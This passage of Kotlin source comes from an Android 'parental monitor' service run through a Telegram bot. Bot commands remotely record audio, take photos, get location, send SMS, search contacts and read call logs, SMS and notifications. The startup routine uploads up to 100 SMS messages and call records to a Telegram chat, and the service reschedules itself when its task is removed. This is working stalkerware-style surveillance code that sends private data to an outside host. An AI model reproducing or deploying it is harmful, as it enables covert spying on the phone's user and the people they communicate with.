                        appendLine("Last camera error: " + if (camErr > 0) formatDate(camErr) else "none")
                        val upErr = try {
                            preferencesManager.lastUploadErrorNotice
                        } catch (_: Exception) {
                            0L
                        }
                        appendLine("Last upload error: " + if (upErr > 0) formatDate(upErr) else "none")
                    }
                )
            }
            "/syncinterval" -> {
                val minutes = arg.toIntOrNull()?.coerceIn(1, 1440)
                if (minutes == null) {
                    sendToTelegram("Usage: /syncinterval \u003c1-1440\u003e (minutes)")
                } else {
                    preferencesManager.syncInterval = minutes
                    try {
                        restartAllLoops()
                    } catch (_: Exception) {
                    }
                    sendToTelegram("\u23F1\uFE0F Sync interval set to $minutes min.")
                }
            }
            "/restart" -> {
                restartAllLoops()
                sendToTelegram("\u267B\uFE0F Loops restarted.")
            }
            "/flush" -> {
                val queued = messageQueue.getQueueSize()
                if (authBlocked()) {
                    sendToTelegram("⚠️ Flush ditunda: kredensial bot ditolak (${preferencesManager.credentialError}). Perbaiki token di Setup.")
                    return
                }
                val scheduled = MessageScheduler.scheduleMessageSend(this)
                if (scheduled) {
                    sendToTelegram("\uD83D\uDCE4 Flush scheduled ($queued queued). Sending when online.")
                } else {
                    sendToTelegram("\u26A0\uFE0F Could not schedule flush ($queued queued).")
                }
            }
            "/clearqueue" -> {
                val queued = messageQueue.getQueueSize()
                try {
                    messageQueue.clearQueue()
                } catch (_: Exception) {
                }
                sendToTelegram("\uD83D\uDDD1\uFE0F Queue cleared ($queued dropped).")
            }
            "/lock" -> {
                try {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    val admin = android.content.ComponentName(this, com.redeye.parentalmonitor.receiver.AdminReceiver::class.java)
                    if (!dpm.isAdminActive(admin)) {
                        sendToTelegram("\u26A0\uFE0F Device Admin not active. Enable it in Setup first.")
                    } else {
                        dpm.lockNow()
                        sendToTelegram("\uD83D\uDD12 Device locked.")
                    }
                } catch (e: SecurityException) {
                    sendToTelegram("\u26A0\uFE0F Cannot lock: Device Admin not active.")
                } catch (e: Exception) {
                    sendToTelegram("\u26A0\uFE0F Lock failed.")
                }
            }
            "/ring" -> {
                val seconds = arg.toIntOrNull()?.coerceIn(5, 60) ?: 15
                if (!ringBusy.compareAndSet(false, true)) {
                    sendToTelegram("\u23F1\uFE0F Already ringing, please wait.")
                } else {
                    ringJob = serviceScope.launch {
                        try {
                            ringDevice(seconds)
                        } finally {
                            ringBusy.set(false)
                        }
                    }
                }
            }
            "/ping" -> {
                if (sentAtSec > 0) {
                    val lag = System.currentTimeMillis() / 1000L - sentAtSec
                    sendToTelegram("\uD83C\uDFD3 Pong! Delay ${lag.coerceAtLeast(0)} s.")
                } else {
                    sendToTelegram("\uD83C\uDFD3 Pong! " + TimeFmt.full(System.currentTimeMillis()))
                }
            }
            "/record" -> {
                val seconds = arg.toIntOrNull()?.coerceIn(5, 60)
                if (seconds == null) {
                    sendToTelegram("Usage: /record \u003c5-60\u003e (seconds)")
                } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("\u26A0\uFE0F Microphone permission missing. Open Setup and grant Microphone permission.")
                } else if (!recordBusy.compareAndSet(false, true)) {
                    sendToTelegram("\u23F1\uFE0F Already recording, please wait.")
                } else {
                    sendToTelegram("\uD83C\uDF99\uFE0F Recording $seconds s\u2026")
                    recordJob = serviceScope.launch {
                        try {
                            recordAndSendAudio(seconds)
                        } finally {
                            recordBusy.set(false)
                        }
                    }
                }
            }
            "/sms" -> {
                val number = arg.substringBefore(" ").trim()
                val smsText = arg.substringAfter(" ", "").trim()
                val normalized = if (number.startsWith("+")) "+" + number.drop(1).filter { it.isDigit() } else number.filter { it.isDigit() }
                if (number.isEmpty() || smsText.isEmpty()) {
                    sendToTelegram("Usage: /sms \u003cnomor\u003e \u003cpesan\u003e")
                } else if (!normalized.matches(SMS_NUMBER_REGEX)) {
                    sendToTelegram("\u26A0\uFE0F Nomor tidak valid. Usage: /sms \u003cnomor\u003e \u003cpesan\u003e")
                } else if (isPremiumSmsNumber(normalized)) {
                    sendToTelegram("\uD83D\uDEAB Nomor premium tidak diizinkan untuk /sms.")
                } else if (smsText.length > 500) {
                    sendToTelegram("\u26A0\uFE0F Pesan terlalu panjang (maks 500 karakter).")
                } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.SEND_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("\u26A0\uFE0F SMS permission missing. Open Setup and grant SMS permission.")
                } else {
                    preferencesManager.pendingSmsNumber = normalized
                    preferencesManager.pendingSmsText = smsText
                    preferencesManager.pendingSmsAt = System.currentTimeMillis()
                    sendToTelegram("\uD83D\uDCE9 SMS ke <code>$normalized</code> siap dikirim. Balas /smsconfirm untuk konfirmasi (berlaku 5 menit).")
                }
            }
            "/smsconfirm" -> {
                val number = preferencesManager.pendingSmsNumber
                val smsText = preferencesManager.pendingSmsText
                val stagedAt = preferencesManager.pendingSmsAt
                if (number.isEmpty() || smsText.isEmpty() || stagedAt <= 0L || System.currentTimeMillis() - stagedAt > 300_000L) {
                    preferencesManager.pendingSmsNumber = ""
                    preferencesManager.pendingSmsText = ""
                    preferencesManager.pendingSmsAt = 0L
                    sendToTelegram("\u23F1\uFE0F Tidak ada SMS tertunda. Kirim /sms \u003cnomor\u003e \u003cpesan\u003e dulu.")
                } else if (System.currentTimeMillis() - preferencesManager.lastSmsSendAt < 60_000L) {
                    sendToTelegram("\u26A0\uFE0F Tunggu sebentar sebelum kirim SMS lagi.")
                } else {
                    sendSmsPending(number, smsText)
                }
            }
            "/lastnotif" -> {
                val items = try {
                    NotificationForwarderService.history()
                } catch (_: Exception) {
                    emptyList()
                }
                if (items.isEmpty()) {
                    sendToTelegram("\uD83D\uDD14 No notifications recorded yet.")
                } else {
                    sendToTelegram(
                        buildString {
                            appendLine("\uD83D\uDD14 <b>Last notifications</b>")
                            for (item in items.takeLast(10)) {
                                appendLine("\u2022 " + Html.escape(item.app) + ": " + Html.escape(item.title.take(80)) + " \u2014 " + Html.escape(item.text.take(120)))
                            }
                        }
                    )
                }
            }
            "/version" -> {
                sendToTelegram(
                    buildString {
                        appendLine("\u2139\uFE0F <b>Version</b>")
                        appendLine("App: " + com.redeye.parentalmonitor.BuildConfig.VERSION_NAME + " (" + com.redeye.parentalmonitor.BuildConfig.VERSION_CODE + ")")
                        appendLine("Android: " + Build.VERSION.SDK_INT + " (" + Build.VERSION.RELEASE + ")")
                        appendLine("Device: " + Build.MANUFACTURER + " " + Build.MODEL)
                    }
                )
            }
            "/uptime" -> {
                val started = serviceStartAt
                if (started <= 0) {
                    sendToTelegram("\u23F1\uFE0F Uptime unknown.")
                } else {
                    val minutes = (System.currentTimeMillis() - started) / 60_000L
                    val hours = minutes / 60
                    val days = hours / 24
                    val span = when {
                        days > 0 -> "$days d ${hours % 24} h"
                        hours > 0 -> "$hours h ${minutes % 60} m"
                        else -> "$minutes m"
                    }
                    sendToTelegram("\u23F1\uFE0F <b>Uptime</b>\nRunning: $span\nSince: " + formatDate(started))
                }
            }
            "/contacts" -> {
                if (arg.isEmpty()) {
                    sendToTelegram("Usage: /contacts \u003cnama\u003e")
                } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("\u26A0\uFE0F Contacts permission missing. Open Setup and grant Contacts permission.")
                } else {
                    val found = searchContacts(arg.take(40))
                    if (found.isEmpty()) {
                        sendToTelegram("\uD83D\uDC64 No contacts matching that name.")
                    } else {
                        sendToTelegram(
                            buildString {
                                appendLine("\uD83D\uDC64 <b>Contacts (${found.size})</b>")
                                for (entry in found) {
                                    appendLine("\u2022 " + Html.escape(entry.first) + " \u2014 " + Html.escape(entry.second))
                                }
                            }
                        )
                    }
                }
            }
            "/apps" -> {
                val limit = arg.toIntOrNull()?.coerceIn(5, 50) ?: 30
                val apps = listLaunchableApps(limit)
                if (apps.isEmpty()) {
                    sendToTelegram("\uD83D\uDCE6 No apps found.")
                } else {
                    sendToTelegram(
                        buildString {
                            appendLine("\uD83D\uDCE6 <b>Apps (${apps.size})</b>")
                            for (label in apps) {
                                appendLine("\u2022 " + Html.escape(label))
                            }
                        }
                    )
                }
            }
            "/storage" -> {
                val (cacheBytes, cachePhotos) = withContext(Dispatchers.IO) { cacheStats() }
                sendToTelegram(
                    buildString {
                        appendLine("\uD83D\uDCBE <b>Storage</b>")
                        appendLine("Cache: " + formatBytes(cacheBytes) + " (" + cachePhotos + " photos)")
                        appendLine("Queued: ${messageQueue.getQueueSize()}")
                    }
                )
            }
            "/history" -> {
                val digits = arg.filter { it.isDigit() }
                if (digits.length < 5) {
                    sendToTelegram("Usage: /history \u003cnomor\u003e (min 5 digit)")
                } else {
                    val calls = try {
                        callLogRepository.getCallsForNumber(digits, 50).filter { numberMatches(it.number, digits) }.take(5)
                    } catch (_: Exception) {
                        emptyList()
                    }
                    val sms = try {
                        smsRepository.getSmsForNumber(digits, 50).filter { numberMatches(it.address, digits) }.take(5)
                    } catch (_: Exception) {
                        emptyList()
                    }
                    if (calls.isEmpty() && sms.isEmpty()) {
                        sendToTelegram("\uD83D\uDD0E No history for $digits.")
                    } else {
                        if (calls.isNotEmpty()) sendToTelegram(formatCallMessage(calls))
                        if (sms.isNotEmpty()) sendToTelegram(formatSmsMessage(sms))
                    }
                }
            }
            "/help", "/start" -> {
                sendToTelegram(
                    buildString {
                        appendLine("👆 <b>Tap a button below</b>")
                        appendLine()
                        appendLine("🤖 <b>Commands</b>")
                        appendLine("/photo - take a photo now")
                        appendLine("/camera \u003cdepan|belakang\u003e - switch camera")
                        appendLine("/location - send current location")
                        appendLine("/lastcalls - show last 5 calls")
                        appendLine("/lastsms - show last 5 SMS")
                        appendLine("/photointerval \u003c0-60\u003e - set photo interval (0 = manual)")
                        appendLine("/pause \u003cminutes\u003e - pause photos")
                        appendLine("/battery - show battery level")
                        appendLine("/status - show monitoring status")
                        appendLine("/stop - pause monitoring")
                        appendLine("/resume - resume monitoring")
                        appendLine("/notif <on|off|status> - notif forwarding")
                        appendLine("/syncinterval \u003c1-1440\u003e - set sync interval")
                        appendLine("/restart - restart monitoring loops")
                        appendLine("/flush - send queued messages now")
                        appendLine("/clearqueue - drop queued messages")
                        appendLine("/lock - lock device screen")
                        appendLine("/ring [5-60] - ring device aloud")
                        appendLine("/ping - check bot delay")
                        appendLine("/record \u003c5-60\u003e - record audio seconds")
                        appendLine("/sms \u003cnomor\u003e \u003cpesan\u003e - send SMS")
                        appendLine("/smsconfirm - kirim SMS yang dikonfirmasi")
                        appendLine("/lastnotif - show last notifications")
                        appendLine("/version - show app/device version")
                        appendLine("/uptime - show service uptime")
                        appendLine("/contacts \u003cnama\u003e - search contacts")
                        appendLine("/apps [N] - list installed apps")
                        appendLine("/storage - show storage usage")
                        appendLine("/history \u003cnomor\u003e - calls+SMS by number")
                        appendLine("/log - show last crash/error log")
                        appendLine("/help - show this list")
                    },
                    mainMenu()
                )
            }
            else -> {
                sendToTelegram("\u2753 Unknown command: $command. Send /help for the list.")
            }
        }
    }

    private fun selectedLensFacing(): Int {
        return if (preferencesManager.cameraFacing == "back") {
            android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
        } else {
            android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
        }
    }

    private fun isPhotoPaused(): Boolean {
        return android.os.SystemClock.elapsedRealtime() < photoPausedElapsed()
    }

    private fun photoPausedElapsed(): Long {
        val stored = try {
            preferencesManager.photoPausedUntil
        } catch (_: Exception) {
            0L
        }
        if (stored <= 0L) return 0L
        if (stored > 1_000_000_000_000L) {
            val remaining = stored - System.currentTimeMillis()
            val migrated = if (remaining > 0L) android.os.SystemClock.elapsedRealtime() + remaining else 0L
            try {
                preferencesManager.photoPausedUntil = migrated
            } catch (_: Exception) {
            }
            return migrated
        }
        return stored
    }

    private fun hasBackgroundLocation(): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return true
        return androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.ACCESS_BACKGROUND_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun isNotifForwarding(): Boolean {
        if (!preferencesManager.notifForwardEnabled) return false
        return try {
            androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(this).contains(packageName)
        } catch (_: Exception) {
            false
        }
    }

    private fun hasLocationPermission(): Boolean {
        val fine = androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.ACCESS_FINE_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        val coarse = androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.ACCESS_COARSE_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        return fine || coarse
    }

    @Suppress("DEPRECATION")
    private suspend fun fetchLocation(): android.location.Location? {
        if (!hasLocationPermission()) return null
        return withContext(Dispatchers.IO) {
            try {
                val locationManager = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
                val providers = listOf(
                    android.location.LocationManager.GPS_PROVIDER,
                    android.location.LocationManager.NETWORK_PROVIDER
                ).filter {
                    try {
                        locationManager.isProviderEnabled(it)
                    } catch (_: Exception) {
                        false
                    }
                }
                for (provider in providers) {
                    try {
                        val last = locationManager.getLastKnownLocation(provider)
                        if (last != null && System.currentTimeMillis() - last.time < 120_000L) {
                            return@withContext last
                        }
                    } catch (_: SecurityException) {
                        return@withContext null
                    }
                }
                val chosen = providers.firstOrNull() ?: return@withContext null
                val result = CompletableDeferred<android.location.Location?>()
                val listener = object : android.location.LocationListener {
                    override fun onLocationChanged(location: android.location.Location) {
                        result.complete(location)
                    }
                    override fun onProviderDisabled(provider: String) {}
                    override fun onProviderEnabled(provider: String) {}
                }
                try {
                    @Suppress("DEPRECATION")
                    locationManager.requestSingleUpdate(chosen, listener, android.os.Looper.getMainLooper())
                } catch (_: SecurityException) {
                    return@withContext null
                }
                try {
                    withTimeoutOrNull(20_000) { result.await() }
                } finally {
                    try {
                        locationManager.removeUpdates(listener)
                    } catch (_: Exception) {
                    }
                }
            } catch (_: Exception) {
                null
            }
        }
    }

    private suspend fun sendInitialData() {
        try {
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Collecting SMS history...")
            // Get all history first
            val allSms = smsRepository.getRecentSms(100)
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Found ${allSms.size} SMS messages")
            
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Collecting call history...")
            val allCalls = callLogRepository.getAllCalls(100)
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Found ${allCalls.size} calls")

            // Send start message
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending start message...")
            val startMessage = buildString {
                appendLine("📱 <b>Monitoring started</b>")
                appendLine()
                appendLine("⏰ Time: ${formatDate(System.currentTimeMillis())}")
                appendLine()
                appendLine("📊 Found on device:")
                appendLine("• SMS: ${allSms.size}")
                appendLine("• Calls: ${allCalls.size}")
                appendLine()
                appendLine("Sending history...")
            }
            sendToTelegram(startMessage)
            delay(500)

            if (allSms.isNotEmpty()) {
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${allSms.size} SMS...")
                val smsTotal = allSms.size
                allSms.chunked(10).forEachIndexed { index, part ->
                    val message = buildString {
                        appendLine("💬 <b>SMS History (${index * 10 + 1}-${index * 10 + part.size} of $smsTotal)</b>")
                        appendLine()
                        part.forEach { sms ->
                            appendLine("📞 Number: ${Html.escape(sms.address)}")
                            val body = Html.escape(sms.body.take(200))
                            appendLine("📝 Text: $body${if (sms.body.length > 200) "..." else ""}")
                            appendLine("🔄 Type: ${sms.getTypeString()}")
                            appendLine("⏰ Time: ${formatDate(sms.date)}")
                            appendLine("━━━━━━━━━━━━━━━━")
                        }
                    }
                    sendFitted(message)
                    try {
                        preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, part.maxOf { it.id })
                    } catch (_: Exception) {
                    }
                    delay(500)
                }
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "All SMS sent")
            }

            if (allCalls.isNotEmpty()) {
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${allCalls.size} calls...")
                val callTotal = allCalls.size
                allCalls.chunked(10).forEachIndexed { index, part ->
                    val message = buildString {
                        appendLine("📞 <b>Call History (${index * 10 + 1}-${index * 10 + part.size} of $callTotal)</b>")
                        appendLine()
                        part.forEach { call ->
                            appendLine("📱 Number: ${Html.escape(call.number)}")
                            if (call.name != null) {
                                appendLine("👤 Name: ${Html.escape(call.name)}")
                            }
                            appendLine("🔄 Type: ${call.getTypeString()}")
                            appendLine("⏱️ Duration: ${call.getDurationString()}")
                            appendLine("⏰ Time: ${formatDate(call.date)}")
                            appendLine("━━━━━━━━━━━━━━━━")
                        }
                    }
                    sendFitted(message)
                    try {
                        val latest = part.maxWith(compareBy({ it.date }, { it.id }))
                        if (latest.date > preferencesManager.lastCallTimestamp ||
                            (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
                        ) {
                            preferencesManager.lastCallTimestamp = latest.date
                            preferencesManager.lastCallId = latest.id
                        }
                    } catch (_: Exception) {
                    }
                    delay(500)
                }
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "All calls sent")
            }

            // Final message
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending completion message...")
            val photoState = if (isPhotoPaused()) {
                val leftMin = ((photoPausedElapsed() - android.os.SystemClock.elapsedRealtime()) / 60_000L).coerceAtLeast(1L)
                "paused ($leftMin min left)"
            } else if (preferencesManager.cameraInterval <= 0) {
                "manual only (/photo)"
            } else {
                "every ${preferencesManager.cameraInterval} min"
            }
            val completeMessage = buildString {
                appendLine("✅ <b>History sync complete</b>")
                appendLine()
                appendLine("From now on, only new SMS and calls will be sent.")
                appendLine()
                appendLine("📊 <b>Now</b>")
                appendLine("Monitoring: ON")
                appendLine("Data interval: ${preferencesManager.syncInterval} min")
                appendLine("Photos: $photoState")
                appendLine("Queued: ${messageQueue.getQueueSize()}")
                appendLine()
                appendLine("All commands are in the bot menu — tap /help anytime.")
            }
            sendToTelegram(completeMessage)
            preferencesManager.initialSyncDone = true
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "=== Initial data sending complete ===")

        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error in initial sync: ${redactToken(e.message)}")
        }
    }

    private suspend fun checkAndSendNewData() {
        if (initialSyncRunning.get()) return
        if (authBlocked()) return
        try {
            val smsPage = smsRepository.getNewSms(preferencesManager.lastSmsId).take(100)
            if (smsPage.isNotEmpty()) {
                sendFitted(formatSmsMessage(smsPage))
                preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, smsPage.maxOf { it.id })
            }
            val callPage = callLogRepository.getNewCalls(preferencesManager.lastCallTimestamp, preferencesManager.lastCallId).take(100)
            if (callPage.isNotEmpty()) {
                sendFitted(formatCallMessage(callPage))
                val latest = callPage.maxWith(compareBy({ it.date }, { it.id }))
                if (latest.date > preferencesManager.lastCallTimestamp ||
                    (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
                ) {
                    preferencesManager.lastCallTimestamp = latest.date
                    preferencesManager.lastCallId = latest.id
                }
            }
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error checking new data: ${redactToken(e.message)}")
        }
    }

    private fun numberMatches(raw: String, digits: String): Boolean {
        val normalized = raw.filter { it.isDigit() }
        if (normalized.isEmpty()) return false
        if (normalized == digits) return true
        if (normalized.length < 5 || digits.length < 5) return false
        return normalized.endsWith(digits) || digits.endsWith(normalized)
    }

    private fun isPremiumSmsNumber(raw: String): Boolean {
        val digits = raw.filter { it.isDigit() }
        if (digits.isEmpty()) return false
        val local = if (digits.startsWith("0")) digits.substring(1) else digits
        if (digits.length in 3..6 && local.startsWith("9")) return true
        return listOf("1900", "900", "976").any { digits.startsWith(it) || local.startsWith(it) }
    }

    private suspend fun sendSmsPending(number: String, smsText: String) {
        try {
            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                getSystemService(android.telephony.SmsManager::class.java)
            } else {
                android.telephony.SmsManager.getDefault()
            }
            if (smsText.length > 160) {
                smsManager.sendMultipartTextMessage(number, null, smsManager.divideMessage(smsText), null, null)
            } else {
                smsManager.sendTextMessage(number, null, smsText, null, null)
            }
            preferencesManager.pendingSmsNumber = ""
            preferencesManager.pendingSmsText = ""
            preferencesManager.pendingSmsAt = 0L
            preferencesManager.lastSmsSendAt = System.currentTimeMillis()
            sendToTelegram("\uD83D\uDCE9 SMS sent to $number.")
        } catch (e: SecurityException) {
            sendToTelegram("\u26A0\uFE0F SMS permission missing. Open Setup and grant SMS permission.")
        } catch (e: Exception) {
            sendToTelegram("\u26A0\uFE0F SMS failed.")
        }
    }

    private fun formatSmsMessage(smsList: List<com.redeye.parentalmonitor.data.models.SmsData>): String {
        return buildString {
            appendLine("💬 <b>New SMS (${smsList.size})</b>")
            appendLine()
            
            smsList.forEach { sms ->
                appendLine("📞 Number: ${Html.escape(sms.address)}")
                val body = Html.escape(sms.body.take(200)) // Limit to 200 chars
                appendLine("📝 Text: $body${if (sms.body.length > 200) "..." else ""}")
                appendLine("🔄 Type: ${sms.getTypeString()}")
                appendLine("⏰ Time: ${formatDate(sms.date)}")
                appendLine("━━━━━━━━━━━━━━━━")
            }
        }
    }

    private fun formatCallMessage(callList: List<com.redeye.parentalmonitor.data.models.CallData>): String {
        return buildString {
            appendLine("📞 <b>New calls (${callList.size})</b>")
            appendLine()
            
            callList.forEach { call ->
                appendLine("📱 Number: ${Html.escape(call.number)}")
                if (call.name != null) {
                    appendLine("👤 Name: ${Html.escape(call.name)}")
                }
                appendLine("🔄 Type: ${call.getTypeString()}")
                appendLine("⏱️ Duration: ${call.getDurationString()}")
                appendLine("⏰ Time: ${formatDate(call.date)}")
                appendLine("━━━━━━━━━━━━━━━━")
            }
        }
    }

    private fun safeCut(text: String, max: Int): Int {
        if (text.length <= max) return text.length
        var cut = max
        if (Character.isHighSurrogate(text[cut - 1]) && Character.isLowSurrogate(text[cut])) cut -= 1
        val amp = text.lastIndexOf('&', cut - 1)
        if (amp >= 0 && amp > cut - 12) {
            val semi = text.indexOf(';', amp)
            if (semi < 0 || semi >= cut) {
                val entity = text.substring(amp, cut)
                if (entity.all { it.isLetterOrDigit() || it == '&' || it == '#' }) cut = amp
            }
        }
        val tag = text.lastIndexOf('<', cut - 1)
        if (tag >= 0 && text.indexOf('>', tag) >= cut) cut = tag
        if (cut <= 0) cut = max
        return cut
    }
    private suspend fun sendFitted(message: String) {
        if (message.length <= 4000) {
            sendToTelegram(message)
            return
        }
        val lines = message.split("\n")
        var current = StringBuilder()
        for (line in lines) {
            var rest = line
            while (rest.length > 4000) {
                if (current.isNotEmpty()) {
                    sendToTelegram(current.toString())
                    delay(500)
                    current = StringBuilder()
                }
                val cut = safeCut(rest, 4000)
                sendToTelegram(rest.substring(0, cut))
                delay(500)
                rest = rest.substring(cut)
            }
            if (current.length + rest.length + 1 > 4000) {
                if (current.isNotEmpty()) {
                    sendToTelegram(current.toString())
                    delay(500)
                }
                current = StringBuilder()
            }
            if (current.isNotEmpty()) current.append("\n")
            current.append(rest)
        }
        if (current.isNotEmpty()) sendToTelegram(current.toString())
    }

    private suspend fun sendToTelegram(
        message: String,
        replyMarkup: com.redeye.parentalmonitor.network.InlineKeyboardMarkup? = null
    ) {
        try {
            if (message.length > 4096) {
                android.util.Log.e("MonitoringService", "Message too long: ${message.length} chars, splitting")
                sendFitted(message)
                return
            }
            
            val (botToken, chatId) = sendCreds()

            if (botToken.isEmpty() || chatId.isEmpty()) {
                android.util.Log.w("MonitoringService", "Bot credentials unavailable, queuing message for later")
                messageQueue.addMessage(message)
                MessageScheduler.scheduleMessageSend(this)
                return
            }

            val hasNetwork = hasNetwork()
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Network available: $hasNetwork")
            
            if (!hasNetwork) {
                // No internet, add to queue
                android.util.Log.w("MonitoringService", "No network, adding to queue")
                messageQueue.addMessage(message)
                MessageScheduler.scheduleMessageSend(this)
                return
            }

            val telegramMessage = TelegramMessage(
                chatId = chatId,
                text = message,
                parseMode = "HTML",
                replyMarkup = replyMarkup
            )

            val url = "https://api.telegram.org/bot${botToken}/sendMessage"
            val response = TelegramClient.api.sendMessage(url, telegramMessage)

            if (response.isSuccessful && response.body()?.ok == true) {
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Message sent")
                preferencesManager.lastSyncTime = System.currentTimeMillis()
                try {
                    preferencesManager.credentialError = ""
                    preferencesManager.credentialErrorAt = 0L
                } catch (_: Exception) {
                }
            } else if (response.code() == 429) {
                val retryAfter = NetworkUtils.parseRetryAfter(response.errorBody()?.string())
                android.util.Log.w("MonitoringService", "Rate limited, will retry via queue after ${retryAfter}s")
                messageQueue.addMessage(message)
                MessageScheduler.scheduleMessageSendNext(this, retryAfter * 1000L)
            } else if (response.code() == 401 || response.code() == 403) {
                android.util.Log.e("MonitoringService", "Auth rejected (${response.code()}), queuing until credentials are fixed")
                try {
                    preferencesManager.credentialError = response.code().toString()
                    preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
                } catch (_: Exception) {
                }
                messageQueue.addMessage(message)
                MessageScheduler.scheduleMessageSend(this)
            } else if (response.code() == 400) {
                val plain = message.replace(TAG_STRIP_REGEX, "")
                if (plain != message) {
                    try {
                        val fallbackUrl = "https://api.telegram.org/bot${botToken}/sendMessage"
                        val fallbackResp = TelegramClient.api.sendMessage(fallbackUrl, TelegramMessage(chatId = chatId, text = plain, parseMode = null))
                        if (fallbackResp.isSuccessful && fallbackResp.body()?.ok == true) {
                            preferencesManager.lastSyncTime = System.currentTimeMillis()
                            try {
                                preferencesManager.credentialError = ""
                                preferencesManager.credentialErrorAt = 0L
                            } catch (_: Exception) {
                            }
                        } else if (fallbackResp.code() == 429) {
                            val retryAfter = NetworkUtils.parseRetryAfter(try { fallbackResp.errorBody()?.string() } catch (_: Exception) { null })
                            messageQueue.addMessage(plain)
                            MessageScheduler.scheduleMessageSendNext(this, retryAfter * 1000L)
                        } else if (fallbackResp.code() == 401 || fallbackResp.code() == 403) {
                            try {
                                preferencesManager.credentialError = fallbackResp.code().toString()
                                preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
                            } catch (_: Exception) {
                            }
                            messageQueue.addMessage(plain)
                            MessageScheduler.scheduleMessageSend(this)
                        } else if (fallbackResp.code() == 408 || fallbackResp.code() >= 500) {
                            messageQueue.addMessage(plain)
                            MessageScheduler.scheduleMessageSend(this)
                        } else {
                            android.util.Log.w("MonitoringService", "Message permanently rejected (400), not queued")
                        }
                    } catch (_: Exception) {
                        messageQueue.addMessage(plain)
                        MessageScheduler.scheduleMessageSend(this)
                    }
                } else {
                    android.util.Log.w("MonitoringService", "Message permanently rejected (400), not queued")
                }
            } else {
                android.util.Log.e("MonitoringService", "✗ Failed to send: ${response.code()}")
                messageQueue.addMessage(message)
                MessageScheduler.scheduleMessageSend(this)
            }
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "✗ Exception sending message: ${redactToken(e.message)}")
            messageQueue.addMessage(message)
            MessageScheduler.scheduleMessageSend(this)
        }
    }

    private fun syncIntervalMillis(): Long {
        if (cachedSyncInterval <= 0) {
            cachedSyncInterval = try {
                preferencesManager.syncInterval
            } catch (_: Exception) {
                com.redeye.parentalmonitor.BuildConfig.SYNC_INTERVAL
            }
        }
        return cachedSyncInterval.coerceIn(1, 1440) * 60_000L
    }

    private fun formatDate(timestamp: Long): String {
        return TimeFmt.full(timestamp)
    }

    private fun stopMonitoring() {
        monitoringJob?.cancel()
        cameraJob?.cancel()
        commandJob?.cancel()
        initialSyncJob?.cancel()
        ringJob?.cancel()
        recordJob?.cancel()
        initialSyncRunning.set(false)
        idlePolls = 0
        isRunning = false
        try {
            loopWatchdogJob?.cancel()
        } catch (_: Exception) {
        }
        watchdogJob?.cancel()
        cameraBusy.set(false)
        try {
            cameraService.forceReset()
        } catch (_: Exception) {
        }
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        try {
            MessageScheduler.scheduleBootRestart(this)
            MessageScheduler.scheduleWatchdog(this)
        } catch (_: Exception) {
        }
        super.onTaskRemoved(rootIntent)
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        try { credsListener?.let { preferencesManager.unregisterChangeListener(it) } } catch (_: Exception) { }
        try {
            cameraBusy.set(false)
            cameraService.forceReset()
        } catch (_: Exception) {
        }
        isRunning = false
        super.onDestroy()
        serviceScope.cancel()
    }
    
    // ═══════════════════════════════════════════════════════════
    // CAMERA MONITORING FUNCTIONS
    // ═══════════════════════════════════════════════════════════
    
    private fun captureAndSendPhoto(reportResult: Boolean = false) {
